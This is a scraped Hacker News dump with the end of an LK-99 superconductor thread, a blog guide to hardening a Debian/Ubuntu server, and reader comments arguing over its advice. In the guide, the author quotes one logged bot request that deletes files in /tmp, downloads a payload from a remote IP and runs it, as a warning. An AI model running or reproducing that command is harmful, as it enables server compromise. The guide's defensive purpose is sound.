thread:https://twitter.com/iris_igb/status/1685731177523449856replyandersa 2 hours ago | parent | next [–] This thread is super frustrating. The person posting it does not at all seem interested in actually demonstrating the effect works... how can you have such a sample and only post this one image which could easily be created by gluing a pebble to the glass? Where's the video of it in action!I want this material to be real so badly.reply7373737373 33 minutes ago | root | parent | next [–] Agreed, if they are unwilling or unable to demonstrate it well, why even bother, why waste viewer's time and attention?A bad/unconvincing/incomplete demonstration is indistinguishable from a scamIf they want to show and distribute the capital-T Truth, they need to take their ego out of the equationreplyasimpletune 2 hours ago | root | parent | prev | next [–] To be fair a video could also be faked and they explain why they're not doing videos and that if you want a replication just wait for the big labs.replyRzor 2 hours ago | root | parent | prev | next [–] We all do, andersa. We all do. I can feel the disappointment brewing. Deep down, I'm almost ready for the archetypal \"measurement error\".replywg0 3 hours ago | prev | next [–] I'm pretty sure that by the end of this month we'll know that the discovery was either instrument, method, process or humam error.replyHavoc 4 hours ago | prev | next [–] This is great. Much easier to tell what’s going on than going by the chatter. Thanksreplyoptimalsolver 4 hours ago | prev | next [–] Stone AgeBronze AgeIron AgeLK-99 Age(source: https://news.ycombinator.com/item?id=36869209)replybhaak 3 hours ago | parent | next [–] No silicon age and plastics age?replyantupis 3 hours ago | parent | prev | next [–] Stone AgeBronze AgeIron AgeI would add Steel Age hereLK-99 Agereplyaskvictor 3 hours ago | root | parent | next [–] Given that human flight and putting things in space rely on Aluminium, I think that's worth a mention too.replytetrep 3 hours ago | root | parent | next [–] And the beverage can! While it seems mundane it's extremely effective at what it does and it's actually recyclable (unlike most things).I think a silicon age would be appropriate too.replyantupis 3 hours ago | root | parent | prev | next [–] I was thinking steel reinforced concrete but yeah Aluminium or Silicon would fit here also.replyPhelinofist 3 hours ago | root | parent | prev | next [–] Don't forget the plastics age...replyacjacobson 3 hours ago | root | parent | prev | next [–] And Silicon after SteelreplyMaken 3 hours ago | root | parent | prev | next [–] Do not forget the Carbon Fiber age.replyjacquesm 3 hours ago | root | parent | prev | next [–] Silicon?reply 13 more comments...",
    "originSummary": [
      "Two papers were recently published on arxiv.org claiming to have created the world's first room-temperature superconductor.",
      "The first paper was short and hastily written, while the second paper provided more detailed information.",
      "The superconductor called LK-99 was created using Lanarkite and Copper Phosphide.",
      "The online reaction to the papers has been a mixture of skepticism and curiosity.",
      "Many institutions and individuals are trying to replicate the results.",
      "There is still ongoing debate about the legitimacy of the claims.",
      "If the claims are true, the discovery of a room-temperature superconductor could have significant implications for various industries."
    ],
    "commentSummary": [
      "The discussions cover a wide range of topics, such as room-temperature superconductors, free markets, government regulation, prediction markets, copyright law, and nuclear fusion.",
      "The conversations explore the pros and cons of these subjects and highlight different perspectives and debates.",
      "Topics include the properties and potential applications of superconductors, the difficulty of synthesizing materials, skepticism surrounding nuclear fusion breakthroughs, and the credibility of a fictional Twitter account.",
      "The discussions provide insights into the role of markets and government regulation, the efficacy of prediction markets, and the wisdom of the crowd.",
      "Overall, the conversations contribute to a deeper understanding of these subjects and encourage critical thinking."
    ],
    "points": 297,
    "commentCount": 269,
    "retryCount": 0,
    "time": 1690795457
  },
  {
    "id": 36934052,
    "title": "The Reluctant Sysadmin's Guide to Securing a Linux Server",
    "originLink": "https://pboyd.io/posts/securing-a-linux-vm/",
    "originBody": "pboyd.io 2023-04-02 The Reluctant Sysadmin's Guide to Securing a Linux Server How to harden Linux when you don't really want toI’m not a sysadmin, and I don’t want to be. But I write software for the web, which means I’m never far from a server, and sometimes I’m the only one around. So even if I didn’t want the job, I have it, and I need to take the security of these hosts seriously. If you’re in a similar situation, this guide is for you. I’ll walk you through the steps I use to harden a new virtual machine from a cloud provider.Ideally, you would automate everything here. But this is a manual guide, where I assume you’ll be typing the commands. I know people still manually configure servers, and if you’re going to do it, at least do it securely. But I hope after you’ve gone through this once or twice, you’ll automate it. I’ll have more to say about automation at the end.I’m making a few assumptions to keep this post brief:Your host is a VM from a cloud provider (AWS, GCP, Linode, etc.) with a standard machine image. Your server has Debian 11 (Bullseye) or Ubuntu. The same basic procedure should work with any Linux distribution, but the details will vary. You know your way around the Linux shell (if you can navigate directories and edit files, you’ll be fine). Know your enemyBefore we get into it, we need to know what we’re up against, and first up are bots. As an experiment, I started a VM in AWS and enabled SSH passwords, and started an HTTP server. After only an hour, I had one failed SSH login and a dozen requests for things like:GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jaws I don’t know what jaws does, but it doesn’t sound friendly. (Hopefully, it’s obvious, but don’t run that–if you really must, I reversed the last octet of the IP address.)These bots scan the Internet looking for any vulnerable systems. The good news is that they’re not out to get you so much as they’re out to get anyone. These attacks are usually easy to stop, keep your host updated, and be a little bit tougher than the next host on their list.But sometimes, there is someone out to get you personally, and sadly no system is truly safe. The best we can do is block what’s known, put up defenses at every layer, and hope we’ve become more trouble than we’re worth. On that cheery note, let’s dive in.Update the softwareEven if you just launched it, your system is probably already outdated. There might even be a critical security vulnerability that didn’t make it into the VM image. So to start:sudo apt updatesudo apt upgradeCreate a user accountYou should not log in directly as root. Use another account and sudo when you need superuser access. Your cloud VM likely has another account already, which you can use, if you wish. But I prefer to make a new account because the default one tends to be obvious.sudo useradd -m -s /bin/bash \\-G users,sudo \\alfred Name your account whatever you like, but avoid anything easily guessable, like admin.The -G line lists groups that the user belongs to. The sudo group will grant access to run commands as root (assuming sudo is configured this way, which it usually is).You’ll need a password for this account. You won’t log in with this password, but you will need it for sudo, so pick a good one. Ideally, generate a random one in your password manager. To set the password:sudo passwd alfred If your VM image disables password logins with SSH, copy the key from the default account to your new account:cp -r ~{admin,alfred}/.sshchown -R alfred:alfred ~alfred/.ssh/ Log out and back in as your new user and verify that sudo works:sudo bash -c 'echo \"I am $USER!\"' It should ask for your password. If it works without a password, then run sudo visudo and replace the line that begins with %sudo with:%sudo ALL=(ALL:ALL) ALL Make sure sudo works before moving on because you can lock yourself out of root if you’re not careful.We don’t want to leave old unused accounts around. So if there’s a default account from your VM image, delete it:sudo userdel adminDisable root loginsNow that we have an account with sudo privileges, there’s no reason anyone should log in with root. First, disable root at the console:sudo passwd -l root Now prevent root from logging in over SSH. Add (or uncomment) this line in /etc/ssh/sshd_config:PermitRootLogin no You will have to restart sshd for the change to take effect, but we’ll have a few more SSH config changes. If you’re anxious to do it now, run:sudo systemctl restart sshumaskWe need to change the default umask, which controls the permissions on new files and directories. Most Linux distributions default umask to 022, which gives read access to every user. Run umask to see your current setting.We want a umask of 077, which removes access to every user except the one who created the file. 027 would work, too (full access for the owner, read for group, and nothing for other). The point is that it’s safer to loosen file permissions when needed rather than tighten them.For sh and bash, we can add umask to /etc/profile:sudo bash -c 'echo -e \"\\numask 077\" >> /etc/profile' If you use another shell, I will assume you know where to configure it.Log out and back in, then verify new files have the desired permissions:$ touch xyz ; ls -l xyz ; rm xyz-rw------- 1 alfred alfred 0 Mar 25 11:23 xyzSSH keysI know you, and I always use new, randomly generated passwords for every account, but most people don’t. Someday you may grant access to someone with bad password hygiene, so it’s best to start right and only allow logins by SSH key. Your cloud provider probably already configured an SSH key for you, but don’t skip this section because the default settings still need to be tweaked.If you have an SSH key already that you want to use, then great. If not, and you’re on Linux or Mac, generate one:ssh-keygen -t rsa -b 4096 If you’re on Windows, PuTTYgen should work (but don’t ask me about it because I’ve never used it).Back on the server now. By default, SSH reads authorized keys from $HOME/.ssh/authorized_keys. The problem is that if an attacker finds an exploit that lets them write one file, you can be sure they’ll attempt to add a public key to $HOME/.ssh/authorized_keys. It’s safer if only root can add an SSH key.We need a central place to keep public keys:sudo mkdir -p /etc/ssh/authorized_keys sudo chmod 0711 /etc/ssh/authorized_keys The permissions on the directory give root full access. Everyone else can read files but not create them or even get a directory listing.We’ll create one file in this directory for each user with SSH access. If you already have an authorized_keys file, you can copy it into place:sudo cp ~alfred/.ssh/authorized_keys /etc/ssh/authorized_keys/alfred If not, paste the public key:sudo bash -c 'echo your public ssh key > /etc/ssh/authorized_keys/alfred' The last step is to make the file readable by the user:sudo setfacl -m u:alfred:r /etc/ssh/authorized_keys/alfred If setfacl doesn’t exist, install it with sudo apt install acl.Before continuing, make sure that your user can read their authorized_keys file:cat /etc/ssh/authorized/keys/$USER If you can’t read it now, SSH won’t be able to read it from your account either, and you’ll be locked out.Now configure SSH to read public keys from our central directory by adding this to /etc/ssh/sshd_config:AuthorizedKeysFile /etc/ssh/authorized_keys/%u While we’re editing sshd_config, we also want to disable password logins (this may already be set):PasswordAuthentication no Restart sshd for those changes to take effect:sudo systemctl restart ssh Don’t log out yet. But do log in from another terminal window to make sure it works.If you have an old authorized_keys file, delete it: rm ~/.ssh/authorized_keys (it isn’t insecure, it’s just confusing to leave an unused file in place).WireGuardWe’ve done the basics to lock down SSH. But, ideally, SSH would not be accessible from the Internet. You could use firewall rules to restrict access to specific IP addresses. But in my case, I have a dynamic IP, and I don’t want to run a bastion host, so that won’t work for me. Fortunately, WireGuard makes running a VPN easy.If you haven’t heard of it, WireGuard is a peer-to-peer VPN. There isn’t a central server. On each host, you set the public keys of its authorized peers. It’s a little bit work to configure, but it works well.One drawback to WireGuard is that the connection goes both ways. If your server is compromised, the attacker can reach any configured peer. Personally, I have the other side of the WireGuard tunnel in a local VM that blocks inbound connections from the tunnel.However you do it, I will assume you have some other host already configured with WireGuard. Before we get started, you’ll need:The public key and private IP of the peer you want to connect from. The private IP to assign to the server. It should be in the same subnet as the peer.Start by installing WireGuard. It’s simple in Debian Bullseye and recent Ubuntu versions:sudo apt install wireguardNow generate a key pair:sudo mkdir -p /etc/wireguard sudo sh -c 'wg genkey | tee /etc/wireguard/private_key | wg pubkey > /etc/wireguard/public_key' And create a config file in /etc/wireguard/wg0.conf:[Interface] Address = 192.168.50.2/24 PrivateKey =ListenPort = 12345[Peer] PublicKey = u8Uo3ab+psKeOpciUIaNuBulNrOCXrU8GN3yD06/0WM= AllowedIPs = 192.168.50.1/32 You’ll need to set the address to an IP on the same subnet as the computer you’re accessing it from. Also, configure the correct AllowedIPs and PublicKey. You can copy/paste the PrivateKey, or use :r /etc/wireguard/private_key in VIM.Set ListenPort to any random ephemeral port number. You can generate one in Bash:echo $(($SRANDOM % 55535 + 10000)) The port number isn’t a secret per se, but WireGuard hides itself well, so we might as well prevent an attacker from knowing it.If your cloud provider has a firewall, don’t forget to open WireGuard’s UDP port.Now start WireGuard:sudo systemctl start wg-quick@wg0sudo systemctl enable wg-quick@wg0 Don’t forget to configure the server as a peer on the computer you’re connecting from. Make sure you can connect to SSH through the WireGuard IP.FirewallYour cloud provider probably has a firewall already. If you’re happy with that, allow WireGuard, block SSH, and call it a day. But if you don’t don’t like that firewall, you can install one on the server.On Debian based systems, I use ufw. Install it with:sudo apt install ufw The first rule we need allows anyone to access the WireGuard port. Change $WG_PORT to whatever you configured in /etc/wireguard/wg0.conf:sudo ufw allow in on eth0 to any port $WG_PORT proto udp Also run ip a and make sure the interface you want to filter is actually eth0, sometimes it may not be.Now we want to allow SSH on WireGuard:sudo ufw allow in on wg0 to any port 22 proto tcp And add any other ports you want open:sudo ufw allow in on eth0 to any port 80 proto tcpsudo ufw allow in on eth0 to any port 443 proto tcp When your rules are in place, cross your fingers and turn on ufw:sudo ufw enable With any luck, SSH remains connected. Don’t log out until you confirm you can get a new SSH connection.Next stepsThere are a few more things you should consider:Find a process to keep your system up to date. Debian’s Automatic Update is one option, though you may want some oversight. Most attacks won’t be against what we’ve covered in this guide, but against the applications you install next. Properly done, containers can limit the impact.Finally, you should automate the job of initializing your host. With practice, this process can be done manually in about 30 minutes, but your automation will be a couple of minutes at most. Manually typing the commands is also error-prone, and a few steps can lock you out if you aren’t careful.If you aren’t sure where to start with automation, I suggest you start simple. For example, write an init script that gets your host to a known state before Ansible (or a similar tool) takes over.If you want to use an init script, I have published some scripts which do everything in this blog post, which you can use directly or as a base for what you really need.Related: How Not to Store Passwords Articles About E-mail Mastodon",
    "commentLink": "https://news.ycombinator.com/item?id=36934052",
    "commentBody": "The Reluctant Sysadmin's Guide to Securing a Linux Server (pboyd.io)291 points by WallyFunk 20  89 commentsgazby 19 hours ago | next [–] There's a reason guides like this are a dime a dozen - there is no way to generalize server configuration this broadly.But as long as we're doing it anyway - the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you'll have no way to recover without booting into another environment.Perhaps one ought not take sysadmin advice from a blog post with a first sentence that reads \"I’m not a sysadmin, and I don’t want to be\".replySparkyte 18 hours ago | parent | next [–] The biggest rules about securing things is don't be in security. Just do your diligence to put your hosts several layers away from public access and make all images and containers hardened with no elevated permissions. Sure vulnerabilities will still exist... if the only thing that can access the container is through a narrowed proxy you are not going get some dumb levels of attacks on your systems.AWS allows you to ssh into your hosts from within AWS. You just manage that security. NO ONE needs public ssh access, no one needs vpn ssh access just AWS ssh access. DON'T OVER COMPLICATE THINGS!I agree with you. I am not gonna say don't follow a system engineers advice. I say follow everyone's advice but pick out the things that seem most reasonable. If it is extra work then you're doing it wrong, simplify everything so that the time spent on resolving issues is faster. Faster resolution means faster security fixes.replyfmitga 18 hours ago | root | parent | next [–] When you say \"no one needs vpn ssh access\" vs \"AWS ssh access\", what is the difference between the two ?replylandemva 15 hours ago | root | parent | next [–] The consoles at big hosts typically require good 2fa to log in to the web management console, which typically can open a command line on the instance. This is a nice authN layer.replyJiocus 4 hours ago | root | parent | next [–] Note that it's possible to configure multi-factor authentication using e.g. one-time password (OTP) for those regular openssh logins. The setup to achieve that still seem quite involved though, so the reluctant sysadmin in me haven't got around to try it.Multiple factors:1FA: Password(1F) OR private key (password blank)(1F)2FA: Private key(1F) with password(2F)MFA: Private key(1F), w/ password(2F) AND OTP(3F)replymrkstu 18 hours ago | root | parent | prev | next [–] As mentioned you then just need to lock down AWS, rather than AWS AND outside access to servers via VPN. Lessen the attack surface.replySparkyte 16 hours ago | root | parent | prev | next [–] The console in AWS allows access within its system. There is no point increasing the access area to the hosts. More surface area the easier it is to be penetrated by ssh vulnerabilities. You also shift fault to AWS rather than your company and team. You did your diligence, you just have to access control and nothing more. IF AWS has a security breach that access to your systems completely on AWS and you can demand compensation.What you want to do is avoid fault, improve tolerance, but extend liability to the provider.replyAdieuToLogic 14 hours ago | root | parent | next [–] > AWS allows you to ssh into your hosts from within AWS.This is where your argument breaks down IMHO. Unless you are saying \"don't expose port 22 to the world...\", which is a common (small) part of security-in-depth.> You also shift fault to AWS rather than your company and team. You did your diligence, you just have to access control and nothing more. IF AWS has a security breach that access to your systems completely on AWS and you can demand compensation.This appears to be an instance of the \"appeal to authority\"[0] fallacy and is of little solace should server(s) one is responsible for become compromised.0 - https://en.wikipedia.org/wiki/Argument_from_authorityreplySparkyte 12 hours ago | root | parent | next [–] You still have to do your diligence. You established what is supposed be a secure system yet that system failed due to provider security. AWS is far more staffed than any other company why wouldn't you shift left to AWS? Why would you hire a fleet of security engineers to do what AWS already established? You are breaking convention, reinventing the wheel and complicating an already simple system.This isn't fallacy it is reducing a businesses cognitive load.replyAdieuToLogic 11 hours ago | root | parent | next [–] > You still have to do your diligence.My point exactly.> You established what is supposed be a secure system yet that system failed due to provider security.This makes no sense. By your own recommendation, \"provider security\" is an AWS offering.> AWS is far more staffed than any other company why wouldn't you shift left to AWS? Why would you hire a fleet of security engineers to do what AWS already established?What does Amazon's staffing have to do with best practices when securing a server deployed on their platform? Who said anything about \"a fleet of security engineers\"? How does any of that relate to securing that which one constructs, and ultimately is responsible for, when using said hosting services?> You are breaking convention, reinventing the wheel and complicating an already simple system.Are you saying that your original statement of \"You also shift fault to AWS rather than your company and team\" is somehow an accepted convention?And what wheel did I \"reinvent\"?Finally, was my identification of the common practice which is moving sshd off of port 22 the complication to which you refer?replySparkyte 11 hours ago | root | parent | next [–] Yeaaah you're trying poke holes. Problem is that there are larger holes in a network if you're setting up and safe guarding a VPN so you can SSH. Moving ssh if even needed at all should be to the provider's secured tools.https://aws.amazon.com/blogs/compute/new-using-amazon-ec2-in...I really don't recommend extending responsibility for creature comforts. However you want to do this so be it.> This makes no sense. By your own recommendation, \"provider security\" is an AWS offering.Are you stating your system is infaliable? So why would you want to bear the infaliable claim and not shift it to the company providing it?> What does Amazon's staffing have to do with best practices when securing a server deployed on their platform? Who said anything about \"a fleet of security engineers\"? How does any of that relate to securing that which one constructs, and ultimately is responsible for, when using said hosting services?Tooling takes a team to support it. You think every company can afford a team to manage that tooling? And why should they? Not all businesses are tech companies but still need a digital footprint. They need to be selfconcious and choose provider practices to get the most out of them.> Are you saying that your original statement of \"You also shift fault to AWS rather than your company and team\" is somehow an accepted convention? Providers own the responsibility of their technology. In terms of failure if access is correctly configured and managed, yet their technology fails they owe your businesses it is very simple.> And what wheel did I \"reinvent\"?Implementing old security practices. Why wouldn't you move to be better pratices and prevent larger holes in your network? Often companies get into this repetitious cycle of reimplementation or reinvention of existing tools and technology just to manage access especially ssh. The convention of using a cloud platform is to use a cloud platform's security access not some sketched up VPN and SSH system.replylandemva 9 hours ago | root | parent | next [–] This sums it up, \"The convention of using a cloud platform is to use a cloud platform\".If you rent compute space, then you trust them to responsibly use the hypervisor instead of snooping. If you trust that or not, you are all in and may as well cement over the external port 22.replySparkyte 6 hours ago | root | parent | next [–] 10000% on the money.replyAdieuToLogic 10 hours ago | root | parent | prev | next [–] > Yeaaah you're trying poke holes.No, I am trying to remind you of the topic which was under discussion. To wit:The Reluctant Sysadmin's Guide to Securing a Linux Server> Are you stating your system is infaliable?A straw man fallacy (sometimes written as strawman) is the informal fallacy of refuting an argument different from the one actually under discussion, while not recognizing or acknowledging the distinction.[0]> Tooling takes a team to support it.See above quote.> You think ...You do not know what I think nor my experiences, so please do not be so arrogant as to assume so.>> And what wheel did I \"reinvent\"?> Implementing old security practices.Again, please refer to the *article under discussion*. In the event it remains unclear, I will restate its title:The Reluctant Sysadmin's Guide to Securing a Linux Server> Why wouldn't you move to be better pratices and prevent larger holes in your network?See previous strawman definition and link below.> Often companies get into this repetitious cycle of reimplementation or reinvention of existing tools and technology just to manage access especially ssh. The convention of using a cloud platform is to use a cloud platform's security access not some sketched up VPN and SSH system.Again, see previous strawman definition above and link below.Note that the only ssh-related recommendation I proffered was:Unless you are saying \"don't expose port 22 to the world...\", which is a common (small) part of security-in-depth.This is a well-known, albeit very small and insufficient by itself, part of helping to reduce attack vectors.As to \"sketched up VPN and SSH system\", I have no idea as to what you are referencing. Perhaps this is a recollection of a previous engagement wherein decisions made remind you of a bad situation similar to, but different than, this?HTH0 - https://en.wikipedia.org/wiki/Straw_manEDIT: corrected spelling from \"waas\" to \"was\"replySparkyte 9 hours ago | root | parent | next [–] Strawman argument sometimes is used to draw out a point. You can not confidently say your security solution is infabiable and nor should you. The article is just a good runbook of things and less a guide. But if you are working on the cloud you shouldn't go using old management methods like they belong in your network.You would not believe how many companies are dependent on patching through users through VPNs in order to access remote hosts. I mean some have to because of no other solutions like managing their own on-prem. I kind of would be interested in AWS access management capable of being implemented within an on-prem.replygettodachoppa 5 hours ago | root | parent | prev | next [–] I'm also a \"non-sysadmin\" like the OP. I'm much more casual than you are:1. Install LTS server with a sudo admin user and complex password (yes, password, not key. I still end up using keys for backup automation because it's easier.)2. apt install fail2ban. Don't even need to configure it: its default configuration will auto-ban any IPs trying to brute-force SSH.3. apt install unattended-upgrades (nowadays installed by default)I'd like to see anyone hack that.You mention running containers with no elevated permissions. I've taken a liking to Docker because, in addition to its many benefits, it lets me separate MY processes from those of the OS. It's just so simple when I can identify the server's running services with \"docker ps\". I'm curious, when was the last time a Docker exploit could escape the container and modify the host? I read it happened in the early days of Docker but is that still a risk? They would need to: a) exploit a bug in a service you're relying on (eg nginx), b) use the former bug to exploit a bug in Docker, c) defeat the Linux kernel's namespace/cgroup isolation. Is that a realistic threat in 2023?replybackendanon 38 minutes ago | parent | prev | next [–] \"the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you'll have no way to recover without booting into another environment.\"As a dev, I say that's a good thing. I've administered my own systems for decades and helped in small startups where we had no full time admin so definitely not new to administering Linux.replyusr1106 8 hours ago | parent | prev | next [–] > the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you'll have no way to recover without booting into another environment.That's not a unique or novel insight. For the case your system gets borked (either by yourself, your hardware or your cloud provider) you need a plan in advance:1. How can I access the data the server has or how much of it can I afford to lose?2. How do I get a replacement running within a time window acceptable for my usage?The answers will be very different depending on your use case. But how you locked the root user has very little impact on them.Booting into another environment is always one option in my plan so locking the root user doesn't frighten me.replyalsobrsp 17 hours ago | parent | prev | next [–] > Perhaps one ought not take sysadmin advice from a blog post with a first sentence that reads \"I’m not a sysadmin, and I don’t want to be\".That's just perfect.replyat_a_remove 12 hours ago | root | parent | next [–] That sounds reasonable, from a \"passion\" angle.However, I would like to hear what someone who dislikes sysadmining but must anyway has to say. Why? A different perspective. I know some sysadmins who \"left the car up on blocks,\" as in, they couldn't stop tweaking and fixing and so on, and they love that, and that's great.Someone who is forced into the job, however, is communicating to me what I would expect to be the most necessary tasks. Maybe I also am in a similar place and would like to get on with the rest of my job. And in an Agile world, programmers get pushed into sysadmining ... at least, in some versions of Agile to which I have been subjected.replyAdieuToLogic 10 hours ago | root | parent | next [–] > However, I would like to hear what someone who dislikes sysadmining but must anyway has to say. ... Someone who is forced into the job ...The only way a job is done consistently well is by those whom want to do that job well consistently.HTHEDIT: added missing \"do\" verb.replyZarathustra30 9 hours ago | root | parent | next [–] Too bad.Sometimes a business can't or won't hire a real sysadmin. The people forced into the job need guides just as much.replyAdieuToLogic 9 hours ago | root | parent | next [–] > Too bad.> Sometimes a business can't or won't hire a real sysadmin. The people forced into the job need guides just as much.I was making a more general statement regarding people having to do tasks they don't want to do, even if they have the skills to do them. Which makes resources helpful to \"people forced into the job\" rather difficult to produce.How can one make a guide to assist people to be successful in something they don't want to do in the first place?replyyjftsjthsd-h 17 hours ago | parent | prev | next [–] > the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you'll have no way to recover without booting into another environment.As opposed to borking the root user and being equally locked out? Assuming your sudo config is a \"configure it once and then leave it forever\" deal - which seems common IME - I can't see any way it would be different.(Mind, this cuts both ways - once you force only key-based SSH, I generally don't see a problem with direct root access either.)replyvbezhenar 16 hours ago | root | parent | next [–] Just don't set root:toor and you'll be alright. Keys are good, but passwords are good as well.replyozim 16 hours ago | parent | prev | next [–] You shouldn’t need root, you should have another person with admin rights as a backup plan.It is a vm so if you do something that would break sudo or all your users you should have a vm snapshot at your fingertips ready to restore from AWS interface.Even if you are running bare metal you should setup snapshots first but nowadays no one runs bare metal web servers it is still som hyper visor with bunch of vm-s that are easy to backup restore or just delete and create fresh.replywindexh8er 14 hours ago | root | parent | next [–] > You shouldn’t need root, you should have another person with admin rights as a backup plan.What?I am the only admin on about a dozen machines. I'm not outsourcing that to a friend. That trust model is much more flawed than separation of duties and permissions segmentation as part of my administration routine.replyvladvasiliu 6 hours ago | root | parent | next [–] What happens if you get hit by a bus, or become otherwise incapacitated?replyozim 7 hours ago | root | parent | prev | next [–] Your manager or company owner should have admin account then, he should not use it for anything besides disaster recovery.If you are single person shop that is your choice, have a root account or whatever you feel like having.replystrzibny 16 hours ago | parent | prev | next [–] That's not true. It's not obvious what user you have that could do sudo. Thus it does improve security. I advice the same in my book (Deployment from Scratch) and I suggest that for both the host system and containers. There is little cost to not primarily using root.replyAdieuToLogic 13 hours ago | root | parent | next [–] >> But as long as we're doing it anyway - the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you'll have no way to recover without booting into another environment.> That's not true. It's not obvious what user you have that could do sudo. Thus it does improve security. I advice the same in my book (Deployment from Scratch) and I suggest that for both the host system and containers. There is little cost to not primarily using root.It is true. To ensure root cannot be used when ssh'ing into a server, set \"PermitRootLogin\" to \"no\" in sshd_config (as mentioned in the OP).Locking out root entirely, as further mentioned in the OP and suggested by your comment, does nothing to increase security regarding remote penetration attacks. Furthermore, should a non-root account which has sudo privileges be compromised, an argument could be made that having a functional root account with its own password accessible only locally and not enabling sudo is a more secure approach.Either way, having a root account which can only be used locally ensures there is a recovery workflow should one be needed, as the GP enumerates.replyteddyh 18 hours ago | prev | next [–] I would instead suggest the official guide; the Securing Debian Manual replyidoubtit 4 hours ago | parent | next [–] Please note that this official guide is more than 6 years old. It means a large parts of its content is obsolete.For instance the chapter on web servers is far from today's best practices. It only mentions Apache http (nowadays Nginx is much more widespread), gives an advice about a default configuration which is no more default, and mentions a path that has changed in recent Debian installs. Even considering its age, the quality of this chapter is dubious: it forgets important points, like disabling .htaccess and directory listing, removing unused modules...Modern tools are obviously missing from this guide: apparmor (though it was in use in 2017), nftables, systemd (unit settings that prevent /home access, prevent privilege escalation, etc)...replynemo8551 17 hours ago | parent | prev | next [–] It might be a bit corporate now but a few years back I found the security aspects of the redhat admin training to be decent enough for most folk.replyteddyh 6 hours ago | root | parent | next [–] The article was explicitly targeted at “Debian 11 (Bullseye) or Ubuntu”.replyjeffbee 19 hours ago | prev | next [–] It's weird to begin such an exercise without stating what the point of \"the server\" is supposed to be. Is it a ... web server? Interactive unix logins for developers? Mail relay? What does it do? This is the key point of the analysis because \"securing\" a server consists in making it incapable of doing anything not in the set of things it is meant to do. Notably, starting from this side of the problem can lead you away from \"standard machine image\". Starting with a kitchen-sink Linux distro like Ubuntu is not the road to hardness.replylinuxdude314 19 hours ago | parent | next [–] It's really not weird, that's not how security works.What the application is doing is relevant to application security, but the whole point of securing the OS is to eliminate the necessity for \"trusting\" the application.When you are securing an operating system, you must assume the application that is exposed to the operating environment (be that the internet, local LAN, even simply user logged into the workstation in the case of a GUI or CLI app) is compromised.The primary goal of most security measures is preventing and detecting privilege escalation and lateral movement within the OS or network.There are a lot of best practices that apply in general to securing an operating system. If you want to dig deeper, one of the best resources for this information is provided by CIS (Center for Internet Security).CIS has hardening standards for most OS's yes even including Ubuntu. https://www.cisecurity.org/benchmark/ubuntu_linuxThese are standards that many security conscious organizations apply to their servers. The US government takes it a step further with DISA's STIGs.DISA STIG's are similar to CIS's benchmarks, but result in an even more locked down environment and place extreme restrictions on which crypto libraries are allowed to be used.In short, securing the OS is a standard best practice that all organizations should be doing. Unfortunately most startups lack engineers with the expertise in building custom linux images so a lot of folks are quite unfamiliar with hardening procedures.You should absolutely NOT use a non-standard OS because you think it will be more secure. It's a much better idea to use known industry standard security benchmarks on supported Linux distributions than trying to bake your own standard some non Debian/RHEL based bistro.replydoublepg23 19 hours ago | root | parent | next [–] IME the checklists and guides can be a useful resource but are mostly “cover your a$$” documentation, often time falling into cargo cult suggestions just to add more check-boxes.replylinuxdude314 18 hours ago | root | parent | next [–] You must be using the wrong 'checklists' (they aren't checklists, they are implementation guidelines). CIS benchmarks and DISA STIGs provide concrete actions that lead to a more secure system. Sure some of them might not apply specifically to your environment, but in general they are an excellent starting point.Some of the line items can be a bit arcane or not as relevant in cloud environments, etc... but that's a far cry from calling them CYA.Nothing cargo cult about enabling SE Linux, restricting access with IP tables, configuring AuditD and AIDE.replygeneralizations 17 hours ago | root | parent | next [–] > Nothing cargo cult about enabling SE Linux, restricting access with IP tables, configuring AuditD and AIDE.These are great ways to massively overcomplicate your system. Generally speaking, having encountered these tools, do not use them unless you're willing to dedicate about 2x the time you would otherwise spend administering the system.replyjdhendrickson 13 hours ago | root | parent | next [–] Just because you had difficulty does not mean you should give such advice to others. There is nothing difficult about configuring any of these systems if you know what you are doing.replywalth 9 hours ago | root | parent | prev | next [–] I'm still not sure on how disabling the crypto algorithms that the NSA prefers to not break helps us stay more secure...replywnevets 19 hours ago | parent | prev | next [–] The second sentence> But I write software for the webI'm going to guess it's a web server but it's just a guess.replyj45 19 hours ago | parent | prev | next [–] 2nd and 3rd sentence“ But I write software for the web, which means I’m never far from a server, and sometimes I’m the only one around.So even if I didn’t want the job, I have it, and I need to take the security of these hosts seriously.”Basic Linux server hardening is not a bad idea or skill to learn. Learning the basics manually help feed into understanding and using higher level solutions.replylinuxdude314 18 hours ago | root | parent | next [–] 100%As long as you are using Debian, RHEL, Ubuntu, or CentOS implementing a basic minimum security baseline is as simple as following the CIS or DISA STIG guides for your OS.There are plenty of scripts on GitHub that do this (AUDIT THEM FIRST), or you can even just use premade images from CIS in the cloud provider of your choice.replyjauntywundrkind 19 hours ago | parent | prev | next [–] Almost every server sits on the internet and has one or two (sometimes a couple more) ports open listening for their apps internet traffic.What the traffic is seems irrelevant to 99.99% of servers out there, imo. Yes there's some questions of what deployments look like and what capabilities operators have but those are details outside the general concern of being safely online. IMO.replyAdieuToLogic 9 hours ago | root | parent | next [–] > Almost every server sits on the internet ...Nope. Not by a long shot.> What the traffic is seems irrelevant to 99.99% of servers out there, imo. Yes there's some questions of what deployments look like and what capabilities operators have but those are details outside the general concern of being safely online. IMO.The following vulnerabilities listing just for the week of 2023-07-17 prove otherwise:https://www.cisa.gov/news-events/bulletins/sb23-205replyjeffbee 14 hours ago | root | parent | prev | next [–] > Almost every server sits on the internetI'm going to counter that the overwhelming majority of hosts in existence do not, in fact, \"sit on the internet\".replyindigodaddy 14 hours ago | root | parent | next [–] Ideally the traffic would be siphoned thru a load balancer/reverse proxy of some kind rather than the dest service endpoint/port being directly exposed to the internetreplyjauntywundrkind 14 hours ago | root | parent | prev | next [–] Sure. But everyone else here was talking about servers. Which, you know,... serve. Are in some way on the internet.replyWoeps 4 hours ago | root | parent | next [–] Host/Servers are in the above case the same thing. And servers can \"serve\" also on local lan, no internet requiredreplyufmace 12 hours ago | prev | next [–] I actually disagree with most of this. I think that, for servers, it's best to stay as close to the \"cattle, not pets\" model as reasonably possible. Servers should be set up and maintained with automated tooling and rarely connected to manually, preferably only to debug issues. Most of the things in here are gimmicky one-offs 